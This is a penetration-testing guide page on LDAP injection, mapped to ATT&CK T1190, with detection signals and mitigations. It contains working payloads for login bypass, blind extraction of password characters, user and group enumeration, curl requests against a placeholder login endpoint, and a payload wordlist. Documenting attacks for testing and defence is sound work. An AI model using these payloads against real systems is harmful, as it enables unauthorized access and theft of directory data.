% Filename: 04-web-testing/injection/ldap-injection.md
% Display name: LDAP Injection
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access)
% ATT&CK Techniques: T1190 (Exploit Public-Facing Application)
% Authors: @TristanInSec

# LDAP Injection

## Overview

LDAP injection occurs when user input is inserted into LDAP queries without sanitization. The attacker manipulates LDAP filter syntax to bypass authentication, extract directory data, or modify queries to return unauthorized results. LDAP injection targets applications that authenticate against or query LDAP directories (Active Directory, OpenLDAP, etc.).

Less common than SQL injection in modern web applications, but frequently found in enterprise portals, intranets, and legacy systems that integrate with Active Directory or other LDAP directories.

## ATT&CK Mapping

- **Tactic:** TA0001 - Initial Access
- **Technique:** T1190 - Exploit Public-Facing Application

## Prerequisites

- Application queries an LDAP directory based on user input
- Input is concatenated into LDAP filter strings without proper escaping
- LDAP directory accessible from the application server

## Detection Methodology

### Identifying LDAP Injection Points

LDAP injection exists where user input reaches LDAP queries. Common locations:

- Login forms authenticating against LDAP/AD
- User search/lookup functionality
- Address book / employee directory searches
- Self-service password reset (username lookup)
- Group membership queries

### LDAP Filter Syntax

LDAP filters follow RFC 4515 syntax. Understanding the format is essential for injection:

```text
(attribute=value)          Simple match
(&(attr1=val1)(attr2=val2))  AND
(|(attr1=val1)(attr2=val2))  OR
(!(attr=val))              NOT
(attr=*)                   Wildcard (any value)
(attr=val*)                Prefix match
```

A typical vulnerable login query:

```text
(&(uid=USER_INPUT)(userPassword=PASS_INPUT))
```

### Boundary Testing

Submit LDAP metacharacters and observe behavior:

```text
*           (wildcard — may return all entries)
)           (closing parenthesis — may break filter)
)(          (may inject new filter condition)
*)(|(&      (attempts to modify filter logic)
\           (escape character)
```

If `*` as a username returns a valid response (e.g., logs in as the first user), LDAP injection is confirmed.

## Techniques

### Authentication Bypass

**Wildcard bypass:**

If the application builds: `(&(uid=USER)(userPassword=PASS))`

```text
Username: *
Password: *
```

Result: `(&(uid=*)(userPassword=*))` — matches any user with any password. The application logs in as the first matching user (often `admin` or the first entry in the directory).

**Tautology bypass:**

```text
Username: *)(&
Password: anything
```

Result: `(&(uid=*)(&)(userPassword=anything))` — the `(&)` is always true, and `uid=*` matches all users. The password check becomes irrelevant depending on how the application evaluates the result.

**Comment truncation:**

Some LDAP implementations ignore everything after a null byte:

```text
Username: admin%00
Password: anything
```

Result: the query is truncated after `admin`, skipping the password check.

**OR injection:**

```text
Username: admin)(|(uid=*
Password: anything
```

Result: `(&(uid=admin)(|(uid=*)(userPassword=anything)))` — the OR condition `uid=*` is always true.

### Data Extraction

**Attribute discovery with wildcards:**

When a search field is vulnerable, use wildcards to enumerate attributes:

```bash
# Does attribute 'description' contain anything?
*)(description=*
```

If results change between `*)(description=*` and `*)(description=NONEXISTENT`, the attribute exists and can be enumerated.

**Blind LDAP extraction (character by character):**

Extract values one character at a time using prefix matching:

```bash
# Is the first character of admin's password 'a'?
admin)(userPassword=a*

# Is it 'b'?
admin)(userPassword=b*

# Found 'p' — now check second character
admin)(userPassword=pa*
admin)(userPassword=pb*
```

Response differences (success vs. failure, different content, different redirect) indicate whether the prefix matches.

**Enumerating usernames:**

```bash
# Check if 'admin' exists
*)(uid=admin
*)(uid=administrator
*)(uid=root

# Wildcard enumeration
*)(uid=a*       (users starting with 'a')
*)(uid=b*       (users starting with 'b')
```

**Extracting group membership:**

```text
*)(memberOf=CN=Domain Admins*
*)(memberOf=CN=IT*
```

### Modifying Query Scope

**Injecting additional filters:**

```bash
# Original: (&(department=USER_INPUT)(objectClass=person))
# Inject to find admins:
IT)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local
```

**Extracting attributes through error-based responses:**

Some applications return different errors or fields depending on the matched entry, leaking attribute data through side channels.

## Automated Testing

LDAP injection testing is primarily manual due to the variety of filter structures. However, web application scanners can help identify injection points:

```bash
# Burp Suite Active Scanner detects basic LDAP injection
# Manual testing with curl is more reliable:

# Test wildcard login
curl -X POST "http://target.com/login" \
  -d "username=*&password=*" -v

# Test with LDAP metacharacters
curl -X POST "http://target.com/login" \
  -d "username=admin%29%28%7C%28uid%3D*&password=test" -v

# URL-encoded: admin)(|(uid=*
```

### Wordlist-Based Testing

Common LDAP injection payloads to test:

```text
*
*)(uid=*)(&
*)(uid=admin
admin)(|(uid=*
admin%00
)(cn=*
*)(%26
*))%00
```

## Detection Methods

### Network-Based Detection

- LDAP metacharacters in HTTP parameters (`*`, `)(`, `|(`, `%00`)
- Unusual patterns in POST data matching LDAP filter syntax
- Application making abnormally broad LDAP queries (returning many entries instead of one)

### Host-Based Detection

- LDAP server logs showing queries with wildcard filters from the web application
- Queries returning significantly more results than expected for normal operations
- LDAP error logs showing malformed filter syntax
- Authentication logs showing successful logins with wildcard or injected filter patterns

## Mitigation Strategies

- **LDAP-specific input escaping** — escape all LDAP special characters per RFC 4515: `*`, `(`, `)`, `\`, NUL (`\00`). Most LDAP libraries provide escaping functions (e.g., `ldap.filter.escape_filter_chars()` in Python's `python-ldap`)
- **Parameterized LDAP queries** — use the LDAP library's parameterized search functions rather than string concatenation
- **Input validation** — whitelist expected characters for usernames (alphanumeric + limited special characters). Reject LDAP metacharacters
- **Least privilege** — the LDAP bind account used by the application should have read-only access to only the attributes needed. Never use a Domain Admin account for application LDAP queries
- **Error handling** — return generic authentication failure messages. Never expose LDAP error details to users

## References

### Official Documentation

- [RFC 4515 - LDAP String Representation of Search Filters](https://datatracker.ietf.org/doc/html/rfc4515)

### Pentest Guides & Research

- [OWASP - LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection)
- [OWASP - Testing for LDAP Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection)

### MITRE ATT&CK

- [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
